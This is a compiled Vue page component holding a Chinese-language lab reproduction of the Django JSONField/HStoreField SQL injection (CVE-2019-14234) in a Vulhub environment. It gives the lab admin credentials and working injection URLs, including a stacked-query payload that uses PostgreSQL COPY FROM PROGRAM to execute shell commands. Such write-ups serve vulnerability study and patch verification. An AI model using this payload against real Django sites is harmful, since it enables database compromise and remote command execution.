import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{r as n,o as d,c as l,a as e,b as a,d as t,e as c}from"./app-58e4a7d6.js";const r={},s=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),p=e("p",null,"Django 在 2019 年 8 月 1 日发布了一个安全更新，修复了在 JSONField、HStoreField 两个模型字段中存在的 SQL 注入漏洞。",-1),u=e("p",null,"参考链接：",-1),g={href:"https://www.djangoproject.com/weblog/2019/aug/01/security-releases/",target:"_blank",rel:"noopener noreferrer"},h={href:"https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html",target:"_blank",rel:"noopener noreferrer"},m=c(`<p>该漏洞需要开发者使用了 JSONField/HStoreField，且用户可控 queryset 查询时的键名，在键名的位置注入 SQL 语句。Django 自带的后台应用 Django-Admin 中就存在这样的写法，我们可以直接借助它来复现漏洞。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Django (1.11.x) Version &lt; 1.11.23
Django (2.1.x) Version &lt; 2.1.11
Django (2.2.x) Version &lt; 2.2.4
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令编译及启动一个存在漏洞的 Django 2.2.3：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose build
docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>环境启动后，访问 <code>http://your-ip:8000</code> 即可看到 Django 默认首页。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>首先登陆后台 <code>http://your-ip:8000/admin/</code>，用户名密码为 <code>admin</code>、<code>a123123123</code>。</p><p>登陆后台后，进入模型 <code>Collection</code> 的管理页面 <code>http://your-ip:8000/admin/vuln/collection/</code>：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221630392.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>然后在 GET 参数中构造 <code>detail__a&#39;b=123</code> 提交，其中 <code>detail</code> 是模型 <code>Collection</code> 中的 JSONField：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:8000/admin/vuln/collection/?detail__a%27b=123
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>可见，单引号已注入成功，SQL 语句报错：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221632754.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>命令执行，执行 <code>touch /tmp/awesome_poc</code>，可以替换成其他命令并且执行。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:8000/admin/vuln/collection/?detail__title&#39;)%3d&#39;1&#39; or 1%3d1 %3bcopy cmd_exec FROM PROGRAM &#39;touch /tmp/awesome_poc&#39;--%20 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>提示 <code>no results to fetch</code> 即为执行成功。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221640588.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,19);function _(b,v){const o=n("ExternalLinkIcon");return d(),l("div",null,[s,p,u,e("ul",null,[e("li",null,[e("a",g,[a("https://www.djangoproject.com/weblog/2019/aug/01/security-releases/"),t(o)])]),e("li",null,[e("a",h,[a("https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html"),t(o)])])]),m])}const w=i(r,[["render",_],["__file","Django JSONField  HStoreField SQL注入漏洞 CVE-2019-14234.html.vue"]]);export{w as default};
